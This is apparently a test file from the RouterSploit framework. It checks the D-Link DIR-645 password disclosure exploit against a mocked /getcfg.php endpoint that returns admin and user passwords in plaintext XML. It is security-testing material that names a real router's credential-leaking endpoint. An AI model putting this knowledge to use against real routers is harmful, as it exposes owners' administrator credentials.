from routersploit.modules.exploits.routers.dlink.dir_645_password_disclosure import Exploit


def test_check_success(target):
    """ Test scenario - successful check """

    route_mock = target.get_route_mock("/getcfg.php", methods=["POST"])
    route_mock.return_value = (
        """
        <?xml version="1.0" encoding="utf-8"?>
        <postxml>
        <module>
            <service>DEVICE.ACCOUNT</service>
            <device>
                <gw_name>DIR-645</gw_name>

                <account>
                    <seqno>2</seqno>
                    <max>2</max>
                    <count>2</count>
                    <entry>
                        <uid>USR-</uid>
                        <name>admin</name>
                        <usrid></usrid>
                        <password>0920983386</password>
                        <group>0</group>
                        <description></description>
                    </entry>
                    <entry>
                        <uid>USR-1</uid>
                        <name>user</name>
                        <usrid></usrid>
                        <password>3616441</password>
                        <group>101</group>
                        <description></description>
                    </entry>
                </account>
                <group>
                    <seqno></seqno>
                    <max></max>
                    <count>0</count>
                </group>
                <session>
                    <captcha>0</captcha>
                    <dummy></dummy>
                    <timeout>600</timeout>
                    <maxsession>128</maxsession>
                    <maxauthorized>16</maxauthorized>
                </session>
            </device>
        </module>
        </postxml>
        """
    )

    exploit = Exploit()

    assert exploit.target == ""
    assert exploit.port == 8080

    exploit.target = target.host
    exploit.port = target.port

    assert exploit.check()
    assert exploit.run() is None
